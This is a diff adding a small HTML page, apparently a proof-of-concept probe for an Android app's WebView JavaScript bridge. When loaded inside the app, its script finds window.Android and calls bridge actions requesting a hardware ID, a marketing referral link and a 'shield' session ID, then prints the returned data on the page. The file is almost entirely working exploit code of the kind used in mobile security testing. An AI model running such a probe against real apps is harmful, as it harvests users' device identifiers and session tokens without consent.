@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>ENUM-PROBE</title></head>
+<body style="background:#111;color:#0f0;font:12px monospace;padding:12px">
+<pre id="log">boot</pre>
+<div id="res" style="margin-top:8px;word-break:break-all"></div>
+<script>
+const log = (s) => { document.getElementById('log').textContent += '\n' + s; };
+log('loaded ' + location.href);
+function showRes(obj) {
+  document.getElementById('res').textContent += JSON.stringify(obj).slice(0, 900) + '\n';
+}
+window.callWebView = (o) => { log('callWebView:'); showRes(o); };
+(function fire() {
+  const A = window.Android;
+  if (!A) { setTimeout(fire, 100); return; }
+  log('Android bridge live');
+  const acts = ['get_hard_id', 'get_marketing_referral_link', 'get_shield_session_id'];
+  let i = 0;
+  const t = setInterval(() => {
+    if (i >= acts.length) { clearInterval(t); log('all sent'); return; }
+    try { A.postMessage(JSON.stringify({name: acts[i], data: {}})); log('sent ' + acts[i]); }
+    catch (e) { log('err ' + acts[i] + ': ' + e); }
+    i++;
+  }, 2000);
+})();
+</script></body></html>
